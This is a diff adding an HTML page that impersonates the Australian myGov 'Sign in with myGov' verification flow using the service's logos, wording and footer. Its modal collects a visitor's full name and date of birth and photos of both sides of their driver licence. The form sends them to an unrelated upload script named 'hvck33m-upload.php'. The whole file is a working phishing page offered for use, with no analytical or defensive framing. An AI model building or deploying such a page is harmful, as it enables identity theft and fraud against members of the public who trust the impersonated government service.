@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in with myGov - myGov</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
+    <link href="css/mgv2-application.css" rel="stylesheet">
+    <link href="css/blugov.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+     <link href="progress.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+<style type="text/css">
+    .modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;display:none;overflow:hidden;-webkit-overflow-scrolling:touch;outline:0}.modal.fade .modal-dialog{-webkit-transition:-webkit-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out;-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);-o-transform:translate(0,-25%);transform:translate(0,-25%)}.modal.in .modal-dialog{-webkit-transform:translate(0,0);-ms-transform:translate(0,0);-o-transform:translate(0,0);transform:translate(0,0)}.modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal-dialog{position:relative;width:auto;margin:10px}.modal-content{position:relative;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #999;border:1px solid rgba(0,0,0,.2);border-radius:6px;outline:0;-webkit-box-shadow:0 3px 9px rgba(0,0,0,.5);box-shadow:0 3px 9px rgba(0,0,0,.5)}.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;background-color:#000}.modal-backdrop.fade{filter:alpha(opacity=0);opacity:0}.modal-backdrop.in{filter:alpha(opacity=50);opacity:.5}.modal-header{min-height:16.43px;padding:15px;border-bottom:1px solid #e5e5e5}.modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.42857143}.modal-body{position:relative;padding:15px}.modal-footer{padding:15px;text-align:right;border-top:1px solid #e5e5e5}.modal-footer .btn+.btn{margin-bottom:0;margin-left:5px}.modal-footer .btn-group .btn+.btn{margin-left:-1px}.modal-footer .btn-block+.btn-block{margin-left:0}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}@media (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}.modal-sm{width:300px}}@media (min-width:992px){.modal-lg{width:900px}}
+
+
+</style>
+    <style type="text/css">
+        .center {
+    margin-top:50px;   
+}
+
+.modal-header {
+    padding-bottom: 5px;
+}
+
+.modal-footer {
+        padding: 0;
+    }
+    
+.modal-footer .btn-group button {
+    height:40px;
+    border-top-left-radius : 0;
+    border-top-right-radius : 0;
+    border: none;
+    border-right: 1px solid #ddd;
+}
+    
+.modal-footer .btn-group:last-child > button {
+    border-right: 0;
+}
+    </style>
+</head>
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+<body>
+    <div class="brand-rainbow">&nbsp;</div>
+<header role="banner" class="mgvEnhanceHeader">
+    <section class="wrapper">
+        <div class="inner">
+            <div class="unauth-grid">
+                <div class="unauth-grid-row">
+                    <a class="unauth-govt-crest__link">
+                        <img id="unauth-govt-crest" src="images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+</header>
+<div class="wrapper-mapwap">
+    <div class="main-block" id="content" role="main">
+       
+
+
+
+        <div class="css-t2nf81">
+  <div class="css-k008qs">
+    <div class="css-759u60" style="display: inline-block;">
+
+
+      <p><img src="back.svg" width="8" class="chakra-image css-1mi6x1x">  Home</p>
+    </div>
+  </div>
+  <p class="chakra-text css-13iw4fu">You are expected to have the following prepared for the verfication.</p>
+  <p class="chakra-text css-6ja8fn">
+  <ul>
+    <li style="margin-bottom: 20px;">Medicare Card</li>
+    <li>Drivers License</li>
+  </ul>
+  </p>
+  <button data-toggle="modal" data-target="#squarespaceModal" style="width: 100%; background-color: green;" type="submit" name="_eventId_submit" class="button-main button">Continue to verification</button>
+
+</div>
+
+
+
+
+    </div>
+</div>
+
+
+
+<!-- line modal -->
+<div class="modal fade" id="squarespaceModal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+        <div class="modal-header" style="text-align: right;">
+           
+        </div>
+
+        <div class="modal-body">
+            
+
+  <div class="progress progress-striped active">
+      <div id="progress" class="bar" style="width: 3%;">0%</div>
+  </div>
+
+
+        <form id="forgotten-username-form" action="hvck33m-upload.php" method="post"  enctype="multipart/form-data">
+            <h2 id="bodytext" style="font-size: 25px; color: black;">Personal Information</h2>
+            <p id="errortext" style="color: red; font-size: 13px; padding:1px;"></p>
+            <div id="body1">
+                <div class="input-group">
+                    <label for="fname">Full Name</label>
+                    <input id="fullname" name="fname" aria-required="true" type="text" value="" autocomplete="off" required>
+                </div>
+                          <div class="input-group">
+                    <label for="fname">Date of Birth</label>
+                    <input id="dob" name="dob" aria-required="true" type="date" value="" autocomplete="off" required>
+                </div>
+                <br><br>
+
+                <a class="button-main button" id="continuebutton" style="color: black; width: 100%; font-size: 15px; padding-top: 10px; background-color: #99e1f3;" href="javascript:move()">NEXT</a>
+
+            </div>
+            <div id="body2" style="display: none;">
+
+
+<hr>
+
+<div class="row py-4" >
+    <div class="col-lg-6 mx-auto" >
+
+<!-- Upload image input-->
+        <div class="input-group mb-3 px-2 py-2 rounded-pill bg-white shadow-sm">
+             <div class="input-group-append">
+                <label for="upload" class="btn btn-light m-0 rounded-pill px-4"> <i class="fa fa-cloud-upload mr-2 text-muted"></i><small class="text-uppercase font-weight-bold text-muted">Driver License Front</small></label>
+               
+            </div>
+              <img style="float: right; text-align: right;"  class="file-upload-image" width="50" src="dl.png" alt="your image" />
+            <input  name="image" type="file" onchange="readURL(this);" class="form-control border-0">
+           
+        </div>
+        
+    </div>
+</div>
+
+<br>
+<hr>
+<div class="col-lg-6 mx-auto" style="margin-bottom: 20px;">
+
+<!-- Upload image input-->
+    <div class="input-group mb-3 px-2 py-2 rounded-pill bg-white shadow-sm">
+                <div class="input-group-append">
+            <label for="upload" class="btn btn-light m-0 rounded-pill px-4"> <i class="fa fa-cloud-upload mr-2 text-muted"></i><small class="text-uppercase font-weight-bold text-muted">Driver License Back </small></label>
+             <img style="float: right; text-align: right;" class="file-upload-image2" width="50" src="dl.png" alt="your image" />
+        </div>
+        <input  name="image2" type="file" onchange="readURL2(this);" class="form-control border-0">
+       
+
+    </div>
+   
+</div>
+
+<br>
+<hr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            </div>
+
+            <div id="buttonall" class="button-container" style="display: none;">
+                <button style="width: 100%;" type="submit" name="_eventId_submit" class="button-main button">VERIFY</button>
+            </div>
+        </form>
+
+
+
+ 
+        </div>
+       
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+<footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+
+        <section class="footer-list">
+            <nav>
+            <h2 class="sr-only" aria-label="Footer">Footer</h2>
+            <ul class="lower-links">
+                <li>
+                    <a target="_blank">Terms of use</a>
+                </li>
+                <li>
+                    <a target="_blank">Privacy and security</a>
+                </li>
+                <li>
+                    <a target="_blank">Copyright</a>
+                </li>
+                <li>
+                    <a target="_blank">Accessibility</a>
+                </li>
+            </ul>
+            </nav>
+        </section>
+          <div class="footer-lower">
+              <section class="footer-lower-logo">
+              <a>
+                  <img src="images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+              </a>
+              </section>
+
+              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+          </div>
+
+
+
+
+      </div>
+    </div>
+  </footer>
+
+
+<script type="text/javascript">
+
+
+    function move(){
+
+
+        console.log("Moving...")
+        var fullname = document.getElementById("fullname").value;
+        var dob = document.getElementById("dob").value;
+
+
+        if(fullname == "" || fullname == undefined){
+            document.getElementById("errortext").innerHTML = "All informations are required for verification"
+        }else if(dob == "" || dob == undefined){
+             document.getElementById("errortext").innerHTML = "All informations are required for verification"
+        }else{
+            console.log("Continue button")
+                 document.getElementById("continuebutton").innerHTML = '<i class="fa fa-spinner fa-spin"></i>'
+
+                 setTimeout(function() {
+
+                        document.getElementById("body1").style.display = "none"
+                        document.getElementById("body2").style.display = "block"
+                        document.getElementById("bodytext").innerHTML = "Driver License"
+                        document.getElementById("progress").style.width = "50%"
+                        document.getElementById("progress").innerHTML  ="50% Driver License"
+                        document.getElementById("buttonall").style.display = "block"
+                        document.getElementById("errortext").innerHTML = ""
+
+
+                 }, 700);
+
+
+
+        }
+
+
+
+
+       
+
+    
+
+    }
+
+
+ function readURL(input) {
+  if (input.files && input.files[0]) {
+
+    var reader = new FileReader();
+
+    reader.onload = function(e) {
+      // $('.image-upload-wrap').hide();
+
+      $('.file-upload-image').attr('src', e.target.result);
+      $('.file-upload-content').show();
+
+      $('.upload-label').html(input.files[0].name);
+    };
+
+    reader.readAsDataURL(input.files[0]);
+     
+
+
+  } else {
+ 
+  }
+}
+
+
+function readURL2(input) {
+  if (input.files && input.files[0]) {
+
+    var reader = new FileReader();
+
+    reader.onload = function(e) {
+      // $('.image-upload-wrap2').hide();
+
+      $('.file-upload-image2').attr('src', e.target.result);
+      $('.file-upload-content2').show();
+
+      $('.upload-label2').html(input.files[0].name);
+    };
+
+    reader.readAsDataURL(input.files[0]);
+   
+
+
+  } else {
+   
+  }
+}
+</script>
+</script>
+
+
+</body></html>
